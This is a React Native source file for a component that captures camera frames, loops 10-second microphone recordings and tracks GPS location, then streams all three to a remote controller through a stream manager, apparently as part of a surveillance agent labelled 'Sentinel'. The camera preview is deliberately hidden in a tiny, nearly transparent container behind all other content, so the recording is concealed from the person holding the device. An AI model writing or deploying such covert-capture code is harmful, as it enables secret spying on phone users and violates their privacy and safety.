import React, { useEffect, useRef, useState } from 'react';
import { View, StyleSheet } from 'react-native';
import * as Location from 'expo-location';
import { Camera, useCameraDevice, useCameraPermission, useFrameProcessor } from 'react-native-vision-camera';
import { resize } from 'vision-camera-resize-plugin';
import { Worklets } from 'react-native-worklets-core';
import { Audio, InterruptionModeIOS, InterruptionModeAndroid } from 'expo-av';
import { useAgentStore } from '../store/useAgentStore';
import { streamManager } from '../services/StreamManager';
import { StreamType, Priority } from '../utils/protocol';

// Audio Semaphore to ensure only one recording is prepared globally
let isAudioHardwareLocked = false;

export function MediaStreamer() {
  const { sensors, status, battery, cameraFacing } = useAgentStore();

  const { hasPermission: hasCamPermission, requestPermission: requestCamPermission } = useCameraPermission();
  const [micPermission, requestMicPermission] = Audio.usePermissions();
  const [locPermission, setLocPermission] = useState<boolean | null>(null);

  const device = useCameraDevice(cameraFacing);

  const locationSubscription = useRef<Location.LocationSubscription | null>(null);

  useEffect(() => {
    (async () => {
      if (!hasCamPermission) requestCamPermission();
      if (!micPermission?.granted) requestMicPermission();

      const { status: lStatus } = await Location.requestForegroundPermissionsAsync();
      setLocPermission(lStatus === 'granted');
    })();
  }, [hasCamPermission, micPermission]);

  // Frame processing using Vision Camera
  const updateFrame = Worklets.createRunOnJS((b64: string) => {
    if (!sensors.video || status !== 'CONNECTED') return;

    try {
      const binaryString = atob(b64);
      const bytes = new Uint8Array(binaryString.length);
      for (let i = 0; i < binaryString.length; i++) {
          bytes[i] = binaryString.charCodeAt(i);
      }
      streamManager.sendFrame(StreamType.VIDEO, Priority.HIGH, -45, battery, bytes);
    } catch (e) {
      console.error("Frame send error:", e);
    }
  });

  const frameProcessor = useFrameProcessor((frame) => {
    'worklet';
    try {
      const b64 = resize(frame, {
        scale: { width: 320, height: 240 },
        pixelFormat: 'rgb',
        dataType: 'base64',
      });
      updateFrame(b64 as string);
    } catch (e) {
      // ignore
    }
  }, []);

  // Audio Recording Logic (10s clips)
  const isRecordingAudio = useRef(false);

  useEffect(() => {
    let isMounted = true;

    async function startAudioRecordingLoop() {
      if (isRecordingAudio.current || !isMounted || status !== 'CONNECTED') return;
      isRecordingAudio.current = true;

      try {
        if (sensors.audio) {
          try {
            // Only set mode if hardware isn't locked
            if (!isAudioHardwareLocked) {
              await Audio.setAudioModeAsync({
                allowsRecordingIOS: true,
                interruptionModeIOS: InterruptionModeIOS.DoNotMix,
                playsInSilentModeIOS: true,
                shouldDuckAndroid: true,
                interruptionModeAndroid: InterruptionModeAndroid.DoNotMix,
                playThroughEarpieceAndroid: false,
              });
              isAudioHardwareLocked = true;
            }

            console.log("[Sentinel] Starting 10s Audio Recording...");
            const { recording } = await Audio.Recording.createAsync(
              Audio.RecordingOptionsPresets.HIGH_QUALITY
            );

            // Wait for 10 seconds of recording
            await new Promise(resolve => setTimeout(resolve, 10000));

            if (isMounted) {
              await recording.stopAndUnloadAsync();
              await new Promise(resolve => setTimeout(resolve, 200));
              const uri = recording.getURI();
              if (uri) {
                console.log("[Sentinel] 10s Audio complete:", uri);
                const response = await fetch(uri);
                const blob = await response.blob();
                const reader = new FileReader();
                reader.onloadend = () => {
                  if (reader.result && isMounted) {
                    const buffer = reader.result as ArrayBuffer;
                    console.log(`[Sentinel] Sending ${buffer.byteLength} bytes of audio...`);
                    streamManager.sendFrame(StreamType.AUDIO, Priority.HIGH, -45, battery, new Uint8Array(buffer));
                  }
                };
                reader.readAsArrayBuffer(blob);
              }
            }
          } catch (err) {
            console.error("Audio record error:", err);
          }
        }
      } finally {
        isRecordingAudio.current = false;
      }
    }

    const timer = setInterval(() => {
      if (!isRecordingAudio.current) startAudioRecordingLoop();
    }, 2000);

    return () => {
      isMounted = false;
      clearInterval(timer);
    };
  }, [sensors.audio, status, battery]);

  // Location Tracking
  useEffect(() => {
    if (sensors.location && status === 'CONNECTED' && locPermission) {
      console.log("[Sentinel] Starting location tracking...");
      Location.watchPositionAsync(
        {
          accuracy: Location.Accuracy.Balanced,
          timeInterval: 10000,
          distanceInterval: 10,
        },
        (location) => {
          const payload = new TextEncoder().encode(JSON.stringify({
            lat: location.coords.latitude,
            lng: location.coords.longitude,
          }));
          streamManager.sendFrame(StreamType.LOCATION, Priority.LOW, -50, battery, payload);
        }
      ).then(sub => { locationSubscription.current = sub; });
    } else {
      if (locationSubscription.current) {
        locationSubscription.current.remove();
        locationSubscription.current = null;
      }
    }
    return () => locationSubscription.current?.remove();
  }, [sensors.location, status, locPermission, battery]);

  if (!hasCamPermission || !device) {
    return null;
  }

  return (
    <View style={styles.hiddenContainer} pointerEvents="none">
      <Camera
        style={styles.camera}
        device={device}
        isActive={sensors.video && status === 'CONNECTED'}
        frameProcessor={frameProcessor}
        pixelFormat="rgb"
        audio={false}
      />
    </View>
  );
}

const styles = StyleSheet.create({
  hiddenContainer: {
    position: 'absolute',
    bottom: 0,
    right: 0,
    width: 10,
    height: 10,
    opacity: 0.1,
    overflow: 'hidden',
    zIndex: -1, // Keep it behind everything
  },
  camera: {
    flex: 1,
  }
});
